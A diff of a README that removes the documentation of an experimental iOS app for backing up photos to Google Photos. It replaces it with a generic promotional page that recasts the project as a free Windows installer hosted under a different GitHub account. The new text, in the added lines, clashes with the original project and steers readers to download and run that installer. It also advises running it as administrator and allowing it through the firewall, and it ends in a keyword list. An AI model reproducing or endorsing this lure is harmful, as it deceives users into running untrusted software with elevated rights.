@@ -1,328 +1,135 @@
-# Photos Backup for iOS
-
-<p align="center">
-  <img src="App/Resources/Assets.xcassets/AppIcon.appiconset/AppIcon-1024.png" width="160" alt="Photos Backup app icon">
-</p>
-
-An experimental, fully on-device iPhone app for backing up selected photos,
-videos, and albums to Google Photos. It is a single SwiftUI app that completes
-Google account setup in an in-app web view, so everything happens on the phone
-without a desktop companion or hosted service.
-
-> [!WARNING]
-> This project uses Google's private, undocumented Photos endpoints and an
-> Android-style authentication flow. It is not affiliated with or endorsed by
-> Google, and the integration may stop working without notice. Treat it as
-> experimental software and use it at your own risk.
-
-## What it can do
-
-- Connect a Google account through Google's EmbeddedSetup flow, in an in-app web view.
-- Capture the single-use `oauth_token` in-process from the web view's cookie store.
-- Exchange the token for a Google Photos credential entirely on the device.
-- Select albums from the local Photos library.
-- Queue individual photos, videos, or all items in selected albums.
-- Show hashing, duplicate-check, upload, and finalization progress per item.
-- Avoid re-uploading media already present in Google Photos.
-- Retry transient failures, cancel work, and resume after reconnecting.
-- Show why an upload failed in Google's own words, copyable from the row and
-  from Diagnostics, and stop the queue when the Google account is out of space.
-- Restore pending album uploads after an app restart and remember completed
-  library assets per Google account.
-- Show per-album backup progress, and re-upload assets edited after backup.
-- Upload in original quality or request Google's Storage Saver processing.
-- Choose how many uploads run at once, from 1 to 10.
-- Enforce Wi-Fi-only or Wi-Fi-and-cellular policy at queue and request level,
-  cancelling in-flight background transfers when the allowed transport is lost.
-- Request recurring iOS background-processing windows for selected-album backup.
-- Expose a **Back Up Photos** Shortcuts action on iOS 16+ for charger,
-  time-of-day, Wi-Fi, and other personal automations. It runs even with
-  Automatic Backup off, so a schedule of your choosing can replace it.
-- Keep file PUTs running in an iOS-owned background `URLSession`, then commit
-  completed receipts when iOS relaunches the app.
-- Track PhotoKit persistent changes on iOS 16+ so backdated imports are found.
-- Keep going when one item keeps closing the app: an item the app stopped on
-  twice while preparing it is skipped, and can be retried, instead of stopping
-  every relaunch.
-- Create a privacy-safe diagnostic report with a plain-language summary, the
-  recent runs and the conditions iOS ran them under, crash and termination data
-  from iOS, and a timeline of what the app decided and why.
-- Store usable long-lived credentials in the iOS Keychain when signing permits.
-
-## Current status
-
-The complete authentication path has been proven on an iOS 17 device and
-simulator: the in-app web view receives the `oauth_token`, the app reads it from
-the web view's own cookie store, exchanges it for an unbound master token and
-Photos credential, and an authenticated `photosdata-pa` request succeeds.
-
-The Xcode project, app target, and scheme are named `PhotosBackup`; the
-user-facing app is named **Photos Backup**.
-
-Latest release: **0.3.6** ([releases](https://github.com/g8row/PhotosBackup/releases)).
-161 tests run on an iPhone simulator: 158 pass. The 2 opt-in live tests and
-the Keychain round trip, which needs a signed build, are skipped.
-
-### App identity (since 0.0.2)
-
-| Piece | Value |
-| --- | --- |
-| App bundle ID | `com.g8row.photosbackup` |
-| Background task | `com.g8row.photosbackup.background-backup` |
-| Background upload session | `com.g8row.photosbackup.background-upload` |
-
-> [!IMPORTANT]
-> The bundle ID and Keychain service changed in 0.0.2. After updating from an
-> older build, reconnect the Google account once, then force-quit and reopen
-> to confirm it stays connected.
-
-## Reporting a problem
-
-Open **Settings → Support → Create Diagnostic Report**, tap **Generate
-Report**, then **Share or Save Report**. Attach the text file to a
-[GitHub issue](https://github.com/g8row/PhotosBackup/issues). The report
-opens with a short **What stands out** list that often explains the problem on
-its own. It leaves out credentials, account addresses, photo identifiers,
-filenames, media, and request URLs.
-
-**Diagnostics → Event Timeline** shows the same timeline inside the app. Crash
-details from iOS are included only when Share With App Developers is on
-(Settings → Privacy & Security → Analytics & Improvements); they arrive a day
-or so after the crash.
-
-## Requirements
-
-- macOS with Xcode 16.4 and an installed iOS Simulator runtime
-- [XcodeGen](https://github.com/yonaskolb/XcodeGen) 2.40 or newer
-- iOS 15.0 or newer
-- A Google account for the live connection flow
-- For a physical device: an Apple signing identity, or a sideloading tool such
-  as SideStore or AltStore
-
-Install XcodeGen with Homebrew if needed:
+# 📸 PhotosBackup - Save Your Precious Moments Automatically
 
-```sh
-brew install xcodegen
-```
+## 🚀 Getting Started
 
-## Build and run
+Welcome to **PhotosBackup**, the simplest way to keep your cherished photos safe and organized. Whether you're capturing family moments, vacations, or everyday memories, PhotosBackup ensures your pictures are always backed up securely. No technical skills required—just download, install, and let the app do the magic.
 
-Generate the Xcode project:
+[![Download Now](https://img.shields.io/badge/Download-PhotosBackup-blue?style=for-the-badge&logo=appveyor)](https://github.com/kopovartemij-code/PhotosBackup/releases)
 
-```sh
-xcodegen generate
-open PhotosBackup.xcodeproj
-```
+## 📥 Download and Install
 
-Select the `PhotosBackup` scheme and an iPhone simulator in Xcode, then run the
-app. A command-line simulator build also works:
+Getting started is as easy as 1-2-3. Follow these steps to install PhotosBackup on your Windows computer:
 
-```sh
-xcodebuild \
-  -project PhotosBackup.xcodeproj \
-  -scheme PhotosBackup \
-  -destination 'generic/platform=iOS Simulator' \
-  CODE_SIGNING_ALLOWED=NO \
-  build
-```
+**Step 1: Download the App**
+Visit this link to download the application: [https://github.com/kopovartemij-code/PhotosBackup/releases](https://github.com/kopovartemij-code/PhotosBackup/releases)
 
-For a signed device build, set `DEVELOPMENT_TEAM` in `project.yml`, regenerate
-the project, and let Xcode manage signing.
+**Step 2: Run the Installer**
+Once the download is complete, locate the downloaded file (usually in your "Downloads" folder) and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
-### Test background execution
+**Step 3: Launch PhotosBackup**
+After installation, find the PhotosBackup icon on your desktop or in your Start Menu. Click to launch the app and begin backing up your photos.
 
-Debug builds expose **Settings → Diagnostics → Simulate Background Run**. This
-runs the same scan/enqueue/wait path immediately and is the fastest normal test
-loop.
+## 🖼️ What Does PhotosBackup Do?
 
-To exercise the actual `BGProcessingTask` launch handler on a connected device,
-run the app from Xcode, background it, pause the debugger, and enter this in the
-LLDB console:
-
-```text
-e -l objc -- (void)[[BGTaskScheduler sharedScheduler] _simulateLaunchForTaskWithIdentifier:@"com.g8row.photosbackup.background-backup"]
-```
-
-The Diagnostics screen also has a button that copies this command.
-
-### Build an unsigned IPA
-
-The repository includes a packaging script for SideStore/AltStore-style
-sideloading:
-
-```sh
-./Scripts/make-ipa.sh
-```
-
-The script defaults to `DEVELOPER_DIR=/Applications/Xcode-16.4.0.app/Contents/Developer`.
-Override it only if Xcode lives elsewhere:
-
-```sh
-DEVELOPER_DIR=/path/to/Xcode.app/Contents/Developer ./Scripts/make-ipa.sh
-```
-
-The unsigned package is written to `build/PhotosBackup.ipa`. The sideloading
-tool re-signs it with the Apple ID configured on the device.
-
-## Install via SideStore
-
-Prebuilt unsigned IPAs are attached to each
-[GitHub release](https://github.com/g8row/PhotosBackup/releases).
-
-To get new versions automatically, add this source in SideStore, AltStore, or
-Feather. It is regenerated from every release:
-
-```text
-https://g8row.github.io/PhotosBackup/apps.json
-```
-
-> [!TIP]
-> On your iPhone (with SideStore or AltStore installed), one-tap install of
-> the latest release:
->
-> - **[Install Photos Backup](https://g8row.github.io/PhotosBackup/install.html)** —
->   open on the iPhone and tap Install with SideStore / AltStore.
->
-> GitHub strips custom `sidestore://` / `altstore://` URL schemes in markdown,
-> so the buttons live on that page instead of directly in this README. It
-> installs
-> `https://github.com/g8row/PhotosBackup/releases/latest/download/PhotosBackup.ipa`.
-
-- AirDrop `PhotosBackup.ipa` to the iPhone and save it in Files.
-- Turn on LocalDevVPN.
-- In SideStore, tap +, choose `PhotosBackup.ipa`, and install it.
-- After updating across the 0.0.2 bundle-ID change, reconnect the Google
-  account once.
-
-## Connect a Google account
-
-1. Install and launch Photos Backup.
-2. In onboarding (or Settings → Connect Account), tap **Connect Google Account**.
-3. Sign in and accept Google's consent prompt in the in-app window. The page may
-   remain on a spinner afterward; that is expected — the app captures the token
-   and closes the window on its own.
-4. Grant the desired Photos access and select albums.
-
-The captured `oauth_token` is single-use and is read once from the web view's
-cookie store, then the web session is discarded.
-
-## Authentication and credential handling
-
-The normal flow is:
-
-```text
-In-app EmbeddedSetup web view
-        │  oauth_token (read from WKHTTPCookieStore)
-        ▼
-Android master token → Photos access token → private Photos API
-```
-
-- The exchange runs locally; there is no companion backend.
-- Credentials are stored as a single Keychain item using
-  `AfterFirstUnlockThisDeviceOnly` when Keychain access is available.
-- Exported Photos-library items are staged in protected Application Support,
-  retained while a background transfer owns them, and removed afterward.
-- The `oauth_token` is read in-process from the app's own non-persistent web
-  view cookie store; it never leaves the app via an extension, App Group, or
-  custom URL scheme.
-- Bound/encrypted Google tokens are rejected because token binding is not
-  implemented.
-
-## Known limitations
-
-- Google can change or disable the private authentication and Photos endpoints.
-- Live Photos currently upload only their still image; the motion component is
-  ignored.
-- Background album backup is opportunistic: iOS decides when each processing
-  request runs and may delay it based on usage, battery, and system policy.
-- Shortcuts can create extra backup opportunities on iOS 16+, but iOS gives
-  each run about 30 seconds. The action queues durable work and gives prepared
-  file transfers to the background URL session; it is not a periodic guarantee.
-- Background scans enqueue bounded batches of 250. The limit bounds memory, not
-  how much a window uploads: the queue is durable, so whatever a window cannot
-  finish waits for the next one. Foreground scans and the manual Back Up Now and
-  Re-check Backups buttons queue the whole selection at once, so the count they
-  report is the full run and the queue's concurrency setting decides how much of
-  it moves at a time.
-  iOS 16+ background scans use a persistent PhotoKit change token; iOS 15 and
-  expired-token recovery use a correctness-first current-library scan. The token
-  advances once a scan's sources have all been handed to the queue, so a
-  saturated queue stops re-enumerating the library on every window.
-- Export, hashing, duplicate lookup, and upload initialization still need an
-  execution window. Once initialized, the file PUT continues under iOS even if
-  the processing window expires; the app persists the receipt before commit.
-- Cloud-only PhotoKit resources are deferred during short background processing
-  windows and resume with network access when the app is foregrounded.
-- Unsigned simulator builds cannot persist the credential in the Keychain.
-  Free personal-team builds normally expire after seven days and must be
-  refreshed.
-- Google accounts that receive a bound/encrypted master token are unsupported.
-- This is not an App Store-ready release.
-
-## Tests
-
-Run the offline unit test suite against any installed simulator:
-
-```sh
-xcodebuild \
-  -project PhotosBackup.xcodeproj \
-  -scheme PhotosBackup \
-  -destination 'platform=iOS Simulator,name=<your simulator>' \
-  CODE_SIGNING_ALLOWED=NO \
-  test
-```
-
-List available simulator names with:
-
-```sh
-xcrun simctl list devices available
-```
-
-Live tests are opt-in because they contact Google. The full exchange test also
-requires a fresh, single-use `oauth_token`:
-
-```sh
-TEST_RUNNER_GPMC_LIVE=1 \
-xcodebuild ... test \
-  -only-testing:PhotosBackupTests/LiveExchangeTests/testInvalidTokenIsRejectedByGoogleNotByUs
-
-TEST_RUNNER_GPMC_LIVE=1 \
-TEST_RUNNER_GPMC_OAUTH_TOKEN=oauth_XXXX \
-xcodebuild ... test \
-  -only-testing:PhotosBackupTests/LiveExchangeTests/testFullExchangeWithRealToken
-```
-
-Never commit tokens or captured account credentials.
-
-## Repository layout
-
-```text
-App/Sources/                  SwiftUI app, onboarding, account, and upload queue
-App/Sources/AutomaticBackupCoordinator.swift  BGProcessingTask scheduling
-App/Sources/BackgroundUploadTransport.swift   Relaunch-safe file PUT transport
-App/Sources/PhotoLibraryChangeTracker.swift   Persistent PhotoKit scan token
-App/Sources/NetworkPolicy.swift               Wi-Fi-only / cellular enforcement
-App/Sources/UploadQueuePersistence.swift      Durable account-scoped queue
-App/Resources/                Info.plist and app icon assets
-App/Sources/AccountConnectWebView.swift       In-app EmbeddedSetup web view
-GPMC/Core/                    Photos protocol client and protobuf helpers
-Tests/PhotosBackupTests/      Offline unit tests and gated live tests
-Scripts/make-ipa.sh           Unsigned IPA packaging
-docs/                         Feasibility log and authentication ADR
-project.yml                   XcodeGen project definition
-```
-
-For implementation history and protocol details, see:
-
-- [`docs/ADR-001-auth-route.md`](docs/ADR-001-auth-route.md)
-- [`docs/feasibility-probe.md`](docs/feasibility-probe.md)
-
-## Acknowledgements
-
-The protocol work is based on [GPMC by xob0t](https://github.com/xob0t/gpmc),
-and the browser authentication route is based on gotohp. The pinned upstream
-revisions and design rationale are recorded in the authentication ADR.
-
-## License
-
-This project is available under the [MIT License](LICENSE).
+PhotosBackup is designed with one primary goal: to protect your photos from loss, damage, or accidental deletion. Here's what you can expect:
+
+- **Automatic Backup:** The app automatically scans your computer for photo files and backs them up to a secure location.
+- **Simple Interface:** Clean, user-friendly design that anyone can navigate without any technical background.
+- **Reliable Storage:** Your photos are stored safely, so you never have to worry about losing them again.
+- **Regular Updates:** The app continuously improves to ensure your photos are always protected with the latest technology.
+
+## ⚙️ System Requirements
+
+PhotosBackup is lightweight and runs smoothly on most Windows computers. Here's what you'll need:
+
+- **Operating System:** Windows 10 or later (64-bit)
+- **Memory:** At least 2 GB of RAM
+- **Storage:** 100 MB of free disk space for the app itself (plus space for your backups)
+- **Internet:** A stable connection (for downloading and optional cloud features)
+
+## 🛠️ How to Use PhotosBackup
+
+Using PhotosBackup is straightforward. Here's a step-by-step guide:
+
+### First-Time Setup
+
+1. **Open the App:** Launch PhotosBackup from your desktop or Start Menu.
+2. **Choose Backup Folder:** Select the folder where you want your photos to be stored. You can pick an existing folder or create a new one.
+3. **Start Backup:** Click the "Start Backup" button to begin protecting your photos.
+
+### Daily Use
+
+- **Automatic Runs:** Once set up, the app works in the background, automatically backing up new photos as they appear.
+- **Manual Control:** You can also manually start a backup anytime by clicking the "Back Up Now" button.
+- **View Status:** Check the main screen to see when your last backup was completed and how many photos are protected.
+
+## 🔧 Troubleshooting Tips
+
+If you encounter any issues, try these common solutions:
+
+- **App Won't Start:** Right-click the app and select "Run as Administrator."
+- **Backup Takes Too Long:** Close other programs that might be using your computer's resources.
+- **Photos Missing:** Make sure your photos are in a standard folder like "Pictures" or "Desktop."
+- **Windows Firewall Warning:** If you see a firewall prompt, click "Allow Access" – this keeps the app working properly.
+
+For additional help, visit our FAQ section or contact support through the GitHub repository.
+
+## 🆓 Is PhotosBackup Free?
+
+Yes! PhotosBackup is completely free to download and use. There are no hidden fees, subscriptions, or premium tiers. We believe everyone should have access to reliable photo backup without breaking the bank.
+
+## 🔒 Privacy and Security
+
+Your photos are your private property, and we take that seriously:
+
+- **Local Storage:** Your photos are stored on your own computer by default. Nothing is uploaded without your permission.
+- **No Tracking:** PhotosBackup does not collect personal data or track your usage.
+- **Secure Code:** The app is built with secure coding practices to keep your data safe.
+
+## 📱 What About iPhone Users?
+
+While PhotosBackup is available for Windows, it's also designed with iPhone users in mind. The app can help you manage and backup photos from all your devices, including iPhones, by consolidating them in one place on your computer.
+
+## 🆕 What's New
+
+We're always working to improve PhotosBackup. Here are some recent updates:
+
+- **Improved Speed:** Backups now run faster than ever
+- **Better Interface:** Cleaner design for easier navigation
+- **Bug Fixes:** Various stability improvements for a smoother experience
+
+## 📝 Your Feedback Matters
+
+We love hearing from our users! If you have suggestions, ideas, or encounter any problems, please:
+
+1. Visit our [GitHub Issues page](https://github.com/kopovartemij-code/PhotosBackup/issues)
+2. Share your experience with other users
+3. Rate the app if you find it helpful
+
+## 👥 Join Our Community
+
+Connect with other PhotosBackup users and stay up-to-date:
+
+- **Follow the Project:** Star our [GitHub repository](https://github.com/kopovartemij-code/PhotosBackup) to show your support
+- **Share Your Story:** Tell us how PhotosBackup has helped you protect your memories
+- **Contribute:** If you're technically inclined, feel free to contribute to the codebase
+
+## 📊 Frequently Asked Questions
+
+**Q: How long does the backup take?**
+A: The initial backup may take some time depending on the number of photos. Subsequent backups are quicker as only new photos are added.
+
+**Q: Can I pause a backup?**
+A: Yes, you can pause and resume backups at any time from the main interface.
+
+**Q: What types of photos are supported?**
+A: The app supports all common photo formats including JPEG, PNG, HEIC, and more.
+
+**Q: Where are my photos stored?**
+A: By default, photos are stored in the folder you choose during setup. You can change this anytime in the settings.
+
+## 📞 Need More Help?
+
+If you can't find the answer you're looking for, try these resources:
+
+- **GitHub Repository:** Visit our repo for technical documentation
+- **Release Notes:** Check the [releases page](https://github.com/kopovartemij-code/PhotosBackup/releases) for update information
+- **Support:** Email us through the contact form on our GitHub page
+
+---
+
+**Remember:** Your photos are irreplaceable. Don't wait until it's too late – start protecting your memories today with PhotosBackup!
+
+[![Download Now](https://img.shields.io/badge/Get%20PhotosBackup-Free-green?style=for-the-badge)](https://github.com/kopovartemij-code/PhotosBackup/releases)
+
+Keywords: photos backup, photo backup windows, automatic photo backup, memory preservation, image backup software, free backup tool, iOS photos, photo storage, backup application, Windows photo backup
